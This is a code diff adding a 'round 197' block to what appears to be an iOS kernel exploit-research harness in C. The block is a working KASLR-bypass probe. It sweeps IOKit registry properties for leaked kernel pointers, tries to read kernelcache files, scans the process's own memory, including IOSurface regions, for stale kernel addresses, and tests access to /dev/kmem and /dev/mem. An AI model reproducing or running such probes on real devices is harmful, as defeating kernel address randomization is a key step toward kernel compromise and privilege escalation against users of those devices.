@@ -23294,6 +23294,197 @@ new_modes:
                 rlog("=== r=196 complete ===\n");
             }
 
+            if (rounds == 197) {
+                /*
+                 * r=197: Fixed IOKit registry sweep + kernelcache read +
+                 * process memory scan for kernel pointers.
+                 */
+                rlog("=== r=197: Extended KASLR probe ===\n");
+
+                /* Part A: Fixed IOKit registry scan using root entry */
+                rlog("\n  --- Part A: IOKit registry (fixed) ---\n");
+                io_registry_entry_t root197 = IORegistryGetRootEntry(
+                    kIOMasterPortDefault);
+                rlog("  Root entry: 0x%x\n", root197);
+
+                int kptr_found_a = 0, svc_count_a = 0;
+                if (root197) {
+                    io_iterator_t iter197 = 0;
+                    kern_return_t kr197 = IORegistryEntryCreateIterator(
+                        root197, "IOService",
+                        kIORegistryIterateRecursively, &iter197);
+                    rlog("  Iterator: kr=0x%x\n", kr197);
+
+                    io_registry_entry_t e197;
+                    while ((e197 = IOIteratorNext(iter197)) && svc_count_a < 300) {
+                        io_name_t n197;
+                        IORegistryEntryGetName(e197, n197);
+
+                        CFMutableDictionaryRef p197 = NULL;
+                        kern_return_t pkr = IORegistryEntryCreateCFProperties(
+                            e197, &p197, NULL, 0);
+                        if (pkr == KERN_SUCCESS && p197) {
+                            CFIndex nk = CFDictionaryGetCount(p197);
+                            const void **ks = malloc(nk * sizeof(void*));
+                            const void **vs = malloc(nk * sizeof(void*));
+                            CFDictionaryGetKeysAndValues(p197, ks, vs);
+
+                            for (CFIndex i = 0; i < nk; i++) {
+                                char kb[128] = {0};
+                                if (CFGetTypeID(ks[i]) == CFStringGetTypeID())
+                                    CFStringGetCString(ks[i], kb, sizeof(kb),
+                                        kCFStringEncodingUTF8);
+
+                                if (CFGetTypeID(vs[i]) == CFNumberGetTypeID()) {
+                                    int64_t nv = 0;
+                                    CFNumberGetValue(vs[i],
+                                        kCFNumberSInt64Type, &nv);
+                                    uint64_t uv = (uint64_t)nv;
+                                    if ((uv >> 40) == 0xFFFFFE) {
+                                        rlog("  *** KPTR '%s'.'%s'"
+                                             "=0x%016llx ***\n",
+                                             n197, kb,
+                                             (unsigned long long)uv);
+                                        kptr_found_a++;
+                                    }
+                                } else if (CFGetTypeID(vs[i]) == CFDataGetTypeID()) {
+                                    CFDataRef d = vs[i];
+                                    CFIndex dl = CFDataGetLength(d);
+                                    const uint8_t *dp = CFDataGetBytePtr(d);
+                                    for (CFIndex b = 0; b+7 < dl && b < 1024; b += 8) {
+                                        uint64_t v;
+                                        memcpy(&v, dp + b, 8);
+                                        if ((v >> 40) == 0xFFFFFE) {
+                                            rlog("  *** KPTR '%s'.'%s'"
+                                                 " @%ld=0x%016llx ***\n",
+                                                 n197, kb, (long)b,
+                                                 (unsigned long long)v);
+                                            kptr_found_a++;
+                                        }
+                                    }
+                                }
+                            }
+                            free(ks); free(vs);
+                            CFRelease(p197);
+                        }
+                        IOObjectRelease(e197);
+                        svc_count_a++;
+                    }
+                    if (iter197) IOObjectRelease(iter197);
+                    IOObjectRelease(root197);
+                }
+                rlog("  Scanned %d services, KPTRs found: %d\n",
+                     svc_count_a, kptr_found_a);
+
+                /* Part B: Try to read kernelcache from disk */
+                rlog("\n  --- Part B: Kernelcache file access ---\n");
+                const char *kc_paths[] = {
+                    "/System/Library/Caches/com.apple.kernelcaches/kernelcache",
+                    "/System/Library/Kernels/kernel",
+                    "/usr/standalone/kernelcache",
+                    "/boot/kernelcache",
+                    "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone17",
+                    NULL
+                };
+                for (int pi = 0; kc_paths[pi]; pi++) {
+                    FILE *kf = fopen(kc_paths[pi], "rb");
+                    if (kf) {
+                        fseek(kf, 0, SEEK_END);
+                        long ksz = ftell(kf);
+                        rlog("  OPEN: %s size=%ld\n", kc_paths[pi], ksz);
+                        /* Read first 256 bytes for magic */
+                        fseek(kf, 0, SEEK_SET);
+                        uint8_t hdr[256];
+                        size_t rd = fread(hdr, 1, 256, kf);
+                        rlog("  Header (%zu bytes):", rd);
+                        for (size_t j = 0; j < 32 && j < rd; j++)
+                            rlog(" %02x", hdr[j]);
+                        rlog("\n");
+                        fclose(kf);
+                    } else {
+                        rlog("  FAIL: %s (errno=%d)\n", kc_paths[pi], errno);
+                    }
+                }
+
+                /* Part C: Scan process memory for stale kernel pointers */
+                rlog("\n  --- Part C: Process VM scan ---\n");
+                uint64_t addr_c = 0;
+                uint64_t size_c = 0;
+                uint32_t depth_c = 0;
+                int region_count = 0, kptr_found_c = 0;
+
+                while (region_count < 500) {
+                    vm_region_submap_info_data_64_t info_c;
+                    mach_msg_type_number_t cnt_c = VM_REGION_SUBMAP_INFO_COUNT_64;
+                    kern_return_t kr = mach_vm_region_recurse(
+                        mach_task_self(), &addr_c, &size_c,
+                        &depth_c, (vm_region_recurse_info_t)&info_c, &cnt_c);
+                    if (kr != KERN_SUCCESS) break;
+
+                    if (info_c.share_mode == 5 && info_c.user_tag == 88) {
+                        /* IOSurface shared memory — scan for KPTRs */
+                        uint64_t *scan = (uint64_t *)addr_c;
+                        uint64_t nqw = size_c / 8;
+                        if (nqw > 65536) nqw = 65536;
+                        for (uint64_t q = 0; q < nqw; q++) {
+                            uint64_t v = scan[q];
+                            if ((v >> 40) == 0xFFFFFE) {
+                                rlog("  *** KPTR region 0x%llx+0x%llx"
+                                     " @%llu=0x%016llx tag=%d sm=%d ***\n",
+                                     (unsigned long long)addr_c,
+                                     (unsigned long long)size_c,
+                                     (unsigned long long)(q*8),
+                                     (unsigned long long)v,
+                                     info_c.user_tag, info_c.share_mode);
+                                kptr_found_c++;
+                                if (kptr_found_c >= 10) break;
+                            }
+                        }
+                    }
+                    /* Also check tag 0 (default) regions > 1MB for stale ptrs */
+                    if (info_c.user_tag == 0 && size_c >= 0x100000) {
+                        uint64_t *scan = (uint64_t *)addr_c;
+                        uint64_t nqw = 65536;
+                        for (uint64_t q = 0; q < nqw; q++) {
+                            uint64_t v = scan[q];
+                            if ((v >> 40) == 0xFFFFFE) {
+                                rlog("  *** KPTR region 0x%llx+0x%llx"
+                                     " @%llu=0x%016llx tag=%d sm=%d ***\n",
+                                     (unsigned long long)addr_c,
+                                     (unsigned long long)size_c,
+                                     (unsigned long long)(q*8),
+                                     (unsigned long long)v,
+                                     info_c.user_tag, info_c.share_mode);
+                                kptr_found_c++;
+                                if (kptr_found_c >= 10) break;
+                            }
+                        }
+                    }
+                    region_count++;
+                    addr_c += size_c;
+                }
+                rlog("  Scanned %d regions, KPTRs found: %d\n",
+                     region_count, kptr_found_c);
+
+                /* Part D: Check /dev/kmem, /dev/mem access */
+                rlog("\n  --- Part D: Device file access ---\n");
+                const char *devpaths[] = {
+                    "/dev/kmem", "/dev/mem", "/dev/pf",
+                    "/dev/io", "/dev/dtrace", NULL
+                };
+                for (int di = 0; devpaths[di]; di++) {
+                    int fd = open(devpaths[di], 0 /*O_RDONLY*/);
+                    if (fd >= 0) {
+                        rlog("  OPEN: %s fd=%d\n", devpaths[di], fd);
+                        close(fd);
+                    } else {
+                        rlog("  FAIL: %s errno=%d\n", devpaths[di], errno);
+                    }
+                }
+
+                rlog("=== r=197 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
